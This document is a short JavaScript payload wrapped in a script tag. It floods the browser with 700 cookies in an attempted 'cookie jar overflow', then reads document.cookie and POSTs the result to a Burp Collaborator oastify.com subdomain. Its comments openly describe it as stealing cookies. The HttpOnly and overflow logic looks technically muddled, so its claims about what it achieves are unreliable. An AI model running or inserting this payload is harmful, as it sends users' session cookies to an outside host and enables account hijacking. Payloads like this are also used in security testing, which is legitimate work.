<script>
// Function to set a cookie
function setCookie(name, value, days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

// Function to send stolen cookies to Burp Collaborator subdomain endpoint
function sendStolenCookies(cookies) {
    // Generate a unique identifier for this request
    var uniqueIdentifier = Math.random().toString(36).substring(7);

    // Construct the payload containing stolen cookies and unique identifier
    var payload = JSON.stringify({
        cookies: cookies,
        uniqueIdentifier: uniqueIdentifier
    });

    // Send payload to Burp Collaborator subdomain endpoint
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://" + uniqueIdentifier + ".6u1t6630j7sup2nizaqtgfufy64yssgh.oastify.com", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(payload);
}

// Function to trigger cookie jar overflow and steal cookies
function triggerOverflowAndStealCookies() {
    // Set an initial HttpOnly cookie
    setCookie("HttpOnlyCookie", "InitialValue", 1);

    // Set a large number of cookies to trigger overflow
    for (let i = 0; i < 700; i++) {
        document.cookie = "cookie" + i + "=" + i;
    }

    // Set a new cookie with attacker-controlled value
    document.cookie = "attackerCookie=" + document.cookie;

    // Extract all cookies and send them to Burp Collaborator subdomain endpoint
    sendStolenCookies(document.cookie);
}

// Execute the function to trigger cookie jar overflow and steal cookies
triggerOverflowAndStealCookies();
</script>
